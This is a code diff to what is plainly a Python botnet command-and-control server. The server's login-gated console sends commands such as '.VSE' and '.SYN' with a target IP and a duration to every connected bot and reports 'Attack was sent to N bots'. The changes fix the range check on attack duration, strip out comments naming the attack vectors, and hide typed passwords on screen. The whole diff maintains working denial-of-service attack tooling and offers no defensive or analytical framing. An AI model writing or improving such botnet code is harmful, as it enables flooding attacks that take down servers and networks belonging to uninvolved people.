@@ -41,8 +41,9 @@ def find_login(username, password):
         if x.split(':')[0].lower() == username.lower() and x.split(':')[1] == password:
             return True
 
-def send(socket, data, escape=True):
-    data += Fore.RESET
+def send(socket, data, escape=True, reset=True):
+    if reset:
+        data += Fore.RESET
     if escape:
         data += '\r\n'
     socket.send(str.encode(data))
@@ -124,13 +125,12 @@ def command_line(client):
                 time.sleep(1)
                 break
 
-            # Valve Source Engine Attack Vector
             elif prefix == '.VSE':
                 if len(args) == 3:
                     ip = args[1]
                     secs = args[2]
                     if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 or int(secs) <= 1300:
+                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
                             send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                             broadcast(data)
                         else:
@@ -139,14 +139,13 @@ def command_line(client):
                         send(client, Fore.RED + 'Invalid IP-address')
                 else:
                     send(client, 'Usage: .vse [IP] [TIME]')
-
-            # TCP SYN attack vector
+                                 
             elif prefix == '.SYN':
                 if len(args) == 3:
                     ip = args[1]
                     secs = args[2]
                     if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 or int(secs) <= 1300:
+                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
                             send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                             broadcast(data)
                         else:
@@ -182,7 +181,7 @@ def command_line(client):
                     ip = args[1]
                     secs = args[2]
                     if valid(ip):
-                        if secs.isdigit() and int(secs) >= 10 or int(secs) <= 1300:
+                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
                             send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                             broadcast(data)
                         else:
@@ -217,7 +216,7 @@ def handle_client(client, address):
     password = ''
     while 1:
         send(client, ansi_clear, False)
-        send(client, f'{Fore.MAGENTA}Password{Fore.LIGHTWHITE_EX}: ', False)
+        send(client, f'{Fore.MAGENTA}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
         while not password.strip():
             password = client.recv(1024).decode().strip()
         break
